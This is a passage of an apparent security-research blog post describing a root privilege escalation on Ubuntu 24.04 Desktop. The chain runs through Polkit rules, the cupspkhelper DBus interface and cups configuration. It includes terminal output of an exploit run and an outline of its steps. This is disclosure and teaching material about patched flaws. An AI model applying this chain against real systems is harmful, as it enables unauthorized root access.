src="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1730905024%2FSnyk_Probely.jpg&amp;w=2560&amp;q=75"/></div></div><div class="card-body"><p class="txt-subhead-small txt-ui-headline txt-line-clamp-2" data-component="Title">Snyk Acquires Developer-First DAST Provider Probely</p><a class="button tertiary max-w-full marg-t-auto link-stretched" title="Read press release" data-component="Next Link" href="/news/snyk-acquires-developer-first-dast-provider-probely/">Read press release</a></div></article></div></div></div></div></li><li class="navigation-item" data-component="Nav Item"><a class="nav-link" tabindex="0" aria-expanded="false" role="button" href="/plans/">Pricing</a></li></ul><div class="navigation-buttons"><div class="locale-selector-wrapper" data-component="Locale Selector"><span class="locale-selector-display" aria-hidden="true"><span class="locale-selector-display-label">EN</span></span><label class="sr-only" for="locale-selector">Select your language</label><select id="locale-selector" name="locale-selector" class="locale-selector"><option value="en-US" selected="">English</option><option value="de">Deutsch</option><option value="fr">Français</option><option value="jp">日本語</option><option value="pt-BR">Português (BR)</option></select></div><div class="nav-login" tabindex="0" aria-expanded="false"><span class="nav-login-label">Login</span><div class="nav-login-menu" aria-hidden="true"><div class="nav-login-accordion open" aria-hidden="false" tabindex="0"><p class="nav-login-accordion-label">Free and Team Plan Customers</p><div class="nav-login-accordion-content"><ul class="nav-login-accordion-links"><li><a href="https://app.snyk.io" rel="noopener noreferrer" target="_blank" class="login-link link-external" tabindex="0" data-is-last="false"><i class="general-icon icon-language"></i><div class="login-link-copy"><p class="login-link-label">Snyk</p><p class="login-link-desc">app.snyk.io</p></div></a></li></ul></div></div><div class="nav-login-accordion" aria-hidden="true" tabindex="0"><p class="nav-login-accordion-label">Enterprise Plan Customers</p><div class="nav-login-accordion-content"><ul class="nav-login-accordion-links"><li><a href="https://app.snyk.io" rel="noopener noreferrer" target="_blank" class="login-link link-external" tabindex="0" data-is-last="false"><i class="general-icon">🇺🇸</i><div class="login-link-copy"><p class="login-link-label">Snyk US - 1</p><p class="login-link-desc">app.snyk.io</p></div></a></li><li><a href="https://app.us.snyk.io" rel="noopener noreferrer" target="_blank" class="login-link link-external" tabindex="0" data-is-last="false"><i class="general-icon">🇺🇸</i><div class="login-link-copy"><p class="login-link-label">Snyk US - 2</p><p class="login-link-desc">app.us.snyk.io</p></div></a></li><li><a href="https://app.eu.snyk.io" rel="noopener noreferrer" target="_blank" class="login-link link-external" tabindex="0" data-is-last="false"><i class="general-icon">🇪🇺</i><div class="login-link-copy"><p class="login-link-label">Snyk EU</p><p class="login-link-desc">app.eu.snyk.io</p></div></a></li><li><a href="https://app.au.snyk.io" rel="noopener noreferrer" target="_blank" class="login-link link-external" tabindex="0" data-is-last="true"><i class="general-icon">🇦🇺</i><div class="login-link-copy"><p class="login-link-label">Snyk AU</p><p class="login-link-desc">app.au.snyk.io</p></div></a></li></ul><small class="nav-login-accordion-disclaimer">The region where your data is hosted follows local agreements, and it may not align with your own location.<!-- --> <a href="https://docs.snyk.io/working-with-snyk/regional-hosting-and-data-residency" rel="noopener noreferrer" target="_blank">Find out more</a>.</small></div></div></div></div><a href="https://app.snyk.io/signup" rel="noopener noreferrer" target="_blank" class="button secondary button-small" title="Sign up" data-component="Next Link">Sign up</a><a class="button primary button-small" title="Book a live demo" data-component="Next Link" href="/schedule-a-demo/">Book a live demo</a></div></div></nav></header><main id="main-content"><section class="wide-wrapper marg-b-none pad-v-extra-small"><div class="p-relative content-block"><a class="max-w-content d-flex items-center txt-body-bold txt-action hover:txt-action-secondary focus:outline focus:txt-action-secondary txt-decoration-none transition-fast" href="/blog/"><i class="general-icon icon-chevron-left icon-medium" data-component="General Icon"></i>Snyk Blog</a></div></section><section class="brandui-section marg-t-large"><div class="p-relative brandui-container"><div class="d-flex gap-huge laptop:gap-large mobile:flex-col"><div class="cols-8 mobile:cols-12"><article class="max-w-8 marg-h-auto d-flex flex-col gap-large"><header><h1 class="txt-headline-large">Abusing Ubuntu 24.04 features for root privilege escalation</h1></header><div class="d-flex mobile:flex-col gap-extra-small mobile:gap-small" data-component="Avatar List"><span class="txt-body-bold">Written by<!-- -->: </span><span class="d-flex flex-wrap gap-medium"><div class="avatar-username" data-component="Avatar Username"><div class="avatar avatar-small radius-full" data-name="RM" data-component="Avatar"><img alt="Rory McNamara" loading="lazy" width="24" height="24" decoding="async" data-nimg="1" class="" style="color:transparent" srcSet="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1706637528%2Frory-mcnamara.jpg&amp;w=32&amp;q=75 1x, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1706637528%2Frory-mcnamara.jpg&amp;w=48&amp;q=75 2x" src="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1706637528%2Frory-mcnamara.jpg&amp;w=48&amp;q=75"/></div><p class="txt-ui-body"><a class="txt-body-bold" href="/contributors/rory-mcnamara/">Rory McNamara</a></p></div></span></div><div class="w-full marg-h-auto p-relative aspect-ratio-banner d-none mobile:d-block" data-component="Banner"><img alt="feature-snyk-platform-learn-getting-snyk-setup" fetchpriority="high" decoding="async" data-nimg="fill" class="object-fit-cover radius-medium" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="(max-width: 960px) 100vw, 0vw" srcSet="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=16&amp;q=75 16w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=32&amp;q=75 32w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=48&amp;q=75 48w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=64&amp;q=75 64w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=96&amp;q=75 96w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=128&amp;q=75 128w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=256&amp;q=75 256w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=384&amp;q=75 384w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=580&amp;q=75 580w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=960&amp;q=75 960w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=1240&amp;q=75 1240w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=2560&amp;q=75 2560w" src="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=2560&amp;q=75"/></div><div class="d-flex items-center gap-medium"><p class="txt-body-bold">September 9, 2024</p><span class="d-flex gap-extra-small items-center txt-body-bold"><i class="general-icon icon-time" data-component="General Icon"></i> <!-- -->0<!-- --> <!-- -->mins read</span></div><div id="rich-text-article-503xeqJhZE3OioVTsPd1Se" class="txt-rich-long"><h2>Introduction</h2><p>With the recent release of Ubuntu 24.04, we at Snyk Security Labs thought it would be interesting to examine the latest version of this Linux distribution to see if we could find any interesting privilege escalation vulnerabilities.</p><p>I’ll let the results speak for themselves:</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span>rory@ubuntu2404release:~$ cat /etc/lsb-release
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span>DISTRIB_ID=Ubuntu
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span>DISTRIB_RELEASE=</span><span style="color:#F78C6C">24.04</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span>DISTRIB_CODENAME=noble
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span>DISTRIB_DESCRIPTION=</span><span style="color:#ecc48d">&quot;Ubuntu 24.04 LTS&quot;</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span>rory@ubuntu2404release:~$ id
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span>uid=</span><span style="color:#F78C6C">1000</span><span>(rory) gid=</span><span style="color:#F78C6C">1000</span><span>(rory) groups=</span><span style="color:#F78C6C">1000</span><span>(rory),</span><span style="color:#F78C6C">4</span><span>(adm),</span><span style="color:#F78C6C">24</span><span>(cdrom),</span><span style="color:#F78C6C">27</span><span>(sudo),</span><span style="color:#F78C6C">30</span><span>(dip),</span><span style="color:#F78C6C">46</span><span>(plugdev),</span><span style="color:#F78C6C">100</span><span>(users),</span><span style="color:#F78C6C">114</span><span>(lpadmin)
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span>rory@ubuntu2404release:~$ sh exploit.sh
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span>Re-executing via Desktop
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span>Disabling notifications
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span>Staging cups symlinks
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span>Taking over cupsd.conf
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span>Rewriting cupsd.conf
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span>Taking over cups-files.conf
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span>Setting filter group to netdev
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">16</span><span>Staging </span><span style="color:#c792ea;font-style:italic">for</span><span> wpa_supplicant
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">17</span><span>Triggering wpa_supplicant </span><span style="color:#c792ea;font-style:italic">as</span><span> group netdev via cups
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">18</span>Re-enabling notifications
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">19</span>Cleaning up and providing shell
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">20</span># id
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">21</span><span>uid=</span><span style="color:#F78C6C">0</span><span>(root) gid=</span><span style="color:#F78C6C">0</span><span>(root) groups=</span><span style="color:#F78C6C">0</span><span>(root)</span></code></pre></div><p><strong>During our research</strong>,<strong> we successfully identified a privilege escalation from the default user on a fresh Ubuntu Desktop installation to root.</strong> To achieve this, we chained one small bug in a privileged component together with a number of features, which all work as expected, to achieve arbitrary command execution as root.</p><p>These vulnerabilities were promptly fixed by the respective maintainers and patches are generally available as of the 6th of August 2024. For a more detailed timeline please see the bottom of this post.</p><p>This blog post will outline the journey of our research, discuss how we identified these vulnerabilities, and, we hope, show that you can keep it simple when it comes to exploitation and achieve the same results without needing a very complex (although extremely cool) kernel memory corruption vulnerability, for example.</p><h2>Hunting for root privilege escalation on Linux</h2><h3>User privilege boundaries</h3><p>Whenever I’m looking at something new, especially for privilege escalation vulnerabilities, my first thought is always, “Where are the privilege boundaries?”. This is not a novel place to start, but I find it is always very useful to define what specific thing it is I’m trying to break. There’s no use going into a product to look for vulnerabilities with no plan for what they will even look like.</p><p>When looking at a Linux system such as Ubuntu, there are a handful of very common privilege boundaries. Some, such as setuid binaries, bad file permissions, and Unix sockets, have been around for a long time. I generally skip these things on first blush — they’ve often already been closely examined. I do, of course, come back to them later, but for the density of vulnerabilities, my first port of call is always DBus.</p><p>DBus is, for our purposes at least, a client/server-based remote procedure call (RPC) framework. What this means in practice is that a server, for example, a privileged component that manages users on the system, can register itself on the DBus message bus and offer up a number of methods, which can then be called by clients on the same bus. There are a number of built-in security controls for this bus, including explicit rules for which users or groups can or cannot call methods and even which users can claim to be a specific service. We will expand deeper into the permission model later on.</p><p>I am heavily simplifying what DBus is and can do here, but for the sake of brevity, let’s define DBus as “a service which allows certain users to call methods inside another, possibly privileged, process,” which gives us enough context to establish our privilege boundary of interest.</p><h3>Investigating DBus</h3><p><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/" rel="noopener noreferrer" target="_blank"><u>Many</u></a> before me, and I’m sure many after me, have found vulnerabilities using the DBus interface. At a high level, tooling such as d-feet (now superseded by <a href="https://apps.gnome.org/en-GB/Dspy/" rel="noopener noreferrer" target="_blank"><u>D-Spy</u></a>) can allow you to enumerate all services that have registered methods on the DBus bus and let you test each of the registered methods (modulo permission checks) by showing you the correct arguments that should be provided.</p><p>I used this method to go through all of the services present on a new installation of Ubuntu 24.04 and review what may present an opportunity. After a few days and a fair few false starts, I eventually found the interface <code>org.opensuse.cupspkhelper</code>, which, by looking at the available methods, is used to manage the <code>cups</code> daemon (a service that manages printers and printing). Cups is a privileged process and I know from previous experience (repeatedly <a href="https://issues.chromium.org/issues/40092465" rel="noopener noreferrer" target="_blank"><u>exploiting</u></a> <a href="https://issues.chromium.org/issues/40052058" rel="noopener noreferrer" target="_blank"><u>cups</u></a> on Google’s ChromeOS) that if the privilege boundaries surrounding cups are not careful, cups can be used as a very powerful exploitation gadget.</p><div class="max-w-full w-full marg-h-auto"><figure data-component="Media Asset Container"><img alt="D-feet: Viewing the available methods in the org.opensuse.CupsPkHelper DBus interface" loading="lazy" width="1999" height="1378" decoding="async" data-nimg="1" class="radius-large overflow-hidden" style="color:transparent" srcSet="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1725899741%2Fblog-ubuntu-org.png&amp;w=2560&amp;q=75 1x" src="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1725899741%2Fblog-ubuntu-org.png&amp;w=2560&amp;q=75"/></figure><div class="max-w-6 marg-v-small marg-h-auto txt-center"><em>D-feet: Viewing the available methods in the org.opensuse.CupsPkHelper DBus interface</em></div></div><p>With this in mind, a DBus interface that allows you to manage this daemon could result in some very interesting and unexpected behavior.</p><h3>This feels privileged</h3><p>As you may know or have inferred, printer management tends to be an “admin” task and should generally be privileged. Why, then, are we able to call these methods without entering our password?</p><p>Enter Polkit. Gone are the days of needing to use sudo for everything, with its associated lack of granularity. With Polkit, every privileged action you may want to take can be given its own unique name, and authorization can be defined per-name and take into account how the action is being requested.</p><p>For example, if you want to change the system time, there’s a unique name for that: <code>org.freedesktop.timedate1.set-time</code>:</p><p>Following is the <code>/usr/share/polkit-1/actions/org.freedesktop.timedate1.policy</code> file contents:</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span>        &lt;action id=</span><span style="color:#ecc48d">&quot;org.freedesktop.timedate1.set-time&quot;</span><span>&gt;
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span>                </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">description</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">gettext-domain</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;systemd&quot;</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">Set system time</span><span class="xml" style="color:#7fdbca">&lt;/</span><span class="xml" style="color:#7fdbca">description</span><span class="xml" style="color:#7fdbca">&gt;</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span>                </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">message</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">gettext-domain</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;systemd&quot;</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">Authentication is required to set the system time.</span><span class="xml" style="color:#7fdbca">&lt;/</span><span class="xml" style="color:#7fdbca">message</span><span class="xml" style="color:#7fdbca">&gt;</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span>                </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">defaults</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="xml">                        </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">allow_any</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">auth_admin_keep</span><span class="xml" style="color:#7fdbca">&lt;/</span><span class="xml" style="color:#7fdbca">allow_any</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="xml">                        </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">allow_inactive</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">auth_admin_keep</span><span class="xml" style="color:#7fdbca">&lt;/</span><span class="xml" style="color:#7fdbca">allow_inactive</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="xml">                        </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">allow_active</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">auth_admin_keep</span><span class="xml" style="color:#7fdbca">&lt;/</span><span class="xml" style="color:#7fdbca">allow_active</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="xml">                </span><span class="xml" style="color:#7fdbca">&lt;/</span><span class="xml" style="color:#7fdbca">defaults</span><span class="xml" style="color:#7fdbca">&gt;</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span>                </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">annotate</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">key</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;org.freedesktop.policykit.imply&quot;</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">org.freedesktop.timedate1.set-timezone org.freedesktop.timedate1.set-ntp</span><span class="xml" style="color:#7fdbca">&lt;/</span><span class="xml" style="color:#7fdbca">annotate</span><span class="xml" style="color:#7fdbca">&gt;</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span>        &lt;/action&gt;</code></pre></div><p>This XML for Polkit defines the actions that could be taken, what message should pop up when a password is requested (“Authentication is required to set the system time.”), and what the rules are around who can authenticate (<code>&lt;allow_any&gt;auth_admin_keep&lt;/allow_any&gt;</code>). The <code>auth_admin_keep</code> means an administrator (i.e, someone in the “sudo” group) can use their password to change the time, and the <code>_keep</code> means that the authentication will be remembered for a short time, so you can change the time twice quickly without needing to re-enter your password.</p><p>But how does this apply to us? We aren’t prompted to enter our password when we call the methods on our target DBus interface. Looking at the policy definitions for <code>org.opensuse.cupspkhelper.mechanism</code>, we see that all the actions require <code>auth_admin</code>, which should need the admin password every time.</p><p>The solution to our puzzle is the second half of what makes Polkit powerful: rules. Polkit allows for the definition of rules (written in JavaScript), which can be used to change the behavior of what is defined in the policy file. Looking at the rule sets in the file <code>/usr/share/polkit-1/rules.d</code>, we can find the following snippet:</p><p>The contents of the file <code>/usr/share/polkit-1/rules.d/com.ubuntu.desktop.rules</code>:</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span style="color:#637777;font-style:italic">// Printer administration</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span>polkit.addRule(</span><span style="color:#c792ea;font-style:italic">function</span><span style="color:#82AAFF">(</span><span style="color:#7fdbca">action, subject</span><span style="color:#82AAFF">) </span><span>{
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span>    </span><span style="color:#c792ea;font-style:italic">if</span><span> (action.id.indexOf(</span><span style="color:#ecc48d">&quot;org.opensuse.cupspkhelper.mechanism.&quot;</span><span>) == </span><span style="color:#F78C6C">0</span><span> &amp;&amp;
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span>        subject.active == </span><span style="color:#ff5874">true</span><span> &amp;&amp; subject.local == </span><span style="color:#ff5874">true</span><span> &amp;&amp;
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span>        (subject.isInGroup(</span><span style="color:#ecc48d">&quot;sudo&quot;</span><span>) || subject.isInGroup(</span><span style="color:#ecc48d">&quot;lpadmin&quot;</span><span>))) {
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span>            </span><span style="color:#c792ea;font-style:italic">return</span><span> polkit.Result.YES;
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span>    }
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span>});</code></pre></div><p>This rule is made up of 3 main parts.</p><ul><li><p>The first part, <code>action.id.indexOf(&quot;org.opensuse.cupspkhelper.mechanism.&quot;) == 0</code>, checks to see if this is one of the actions used by our DBus interface by checking the prefix. The specific rule looks similar to <code>org.opensuse.cupspkhelper.mechanism.printer-local-edit</code>.</p></li><li><p>The second section is <code>subject.active == true &amp;&amp; subject.local == true</code>. This is Polkit speak for “Is the user logged in to the computer directly and sat looking at the screen?”. This applies to most direct uses of Ubuntu Desktop, but won’t apply for, SSH sessions on the same machine, for example.</p></li><li><p>The final section <code>(subject.isInGroup(&quot;sudo&quot;) || subject.isInGroup(&quot;lpadmin&quot;))</code> checks to see if the requesting user is in either the “sudo” or “lpadmin” user groups.</p></li></ul><p>If all 3 sets of conditions for this rule are found to be true, i.e a user who is sat in front of their computer, in the sudo or lpadmin groups, and trying to make changes to printers, this rule instructs the authorization check to succeed (<code>polkit.Result.YES</code>) without needing the user to enter their password. This is quite a nice usability feature and will decrease the amount of passwords an administrator will need to type in all the time.</p><p>The problems begin when an attacker is able to compromise the user’s session, potentially through social engineering to execute a payload, or other exploitation (<em>I</em> may not have Chrome full RCE vulnerabilities, but they’ve happened before). In this context they will be able to call interfaces secured in this way without needing to first compromise the user’s password, which may have been necessary if these rules did not exist.</p><p>So we’ve found an interface which crosses a potentially interesting privilege boundary, and we’ve also found that we may be able to call these privileged functions without necessarily needing to compromise the user’s password. This is quite a good starting point for a privilege escalation chain, as privileged functions which are nominally protected, but can be accessed in certain circumstances bypassing said protection may allow us to exploit some interesting behavior.</p><h2>Finding the bug</h2><p>If you’ve read some of my <a href="/blog/leaky-vessels-container-vuln-deep-dive/"><u>previous work</u></a> you may know that I love the <code>strace</code> tool. If you’re not familiar with this tool I encourage you to go back and read the first part of my <a href="/blog/leaky-vessels-container-vuln-deep-dive/"><u>Leaky Vessels deep dive post</u></a>, which contains a primer.</p><p>Whenever exploring an interface across a privilege boundary, it’s a very good habit to attach strace to your target and save the logs. This is a great way to see what’s <em>actually</em> being done by the application when you call each method, and may give you quick wins from low hanging fruit.</p><p>Using this methodology, I observed that the cups daemon was restarting when calling <code>ServerSetSettings</code>. This was identified during the evaluation of the <code>ServerGetSettings</code> and <code>ServerSetSettings</code> methods. These functions are defined as follows (this output is taken from the <code>gdbus introspect</code> tool):</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span>      @org.freedesktop.DBus.GLib.Async(</span><span style="color:#ecc48d">&quot;&quot;</span><span>)
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">2</span>      ServerGetSettings(out s error,
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">3</span>                        out a{ss} settings);
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">4</span><span>      @org.freedesktop.DBus.GLib.Async(</span><span style="color:#ecc48d">&quot;&quot;</span><span>)
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">5</span><span>      ServerSetSettings(</span><span style="color:#c792ea;font-style:italic">in</span><span>  a{ss} settings,
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">6</span>                        out s error);</code></pre></div><p>For those not familiar with DBus datatypes, <code>a{ss}</code> is an “array (<code>a</code>) of structs (<code>{}</code>) mapping a string (<code>s</code>) to a string (<code>s</code>)”. This is functionally equivalent to a dictionary in Python where the keys and values are both strings. By calling ServerGetSettings to get a valid “settings” value and passing that same value to ServerSetSettings, cups performed a restart. From this it can be inferred that the settings being changed are those in cups itself, and the service is restarted to make the changes take effect.</p><p>This matches with what we can observe in the actual output of <code>ServerGetSettings</code>:</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span>{</span><span style="color:#ecc48d">&#x27;BrowseLocalProtocols&#x27;</span><span>: </span><span 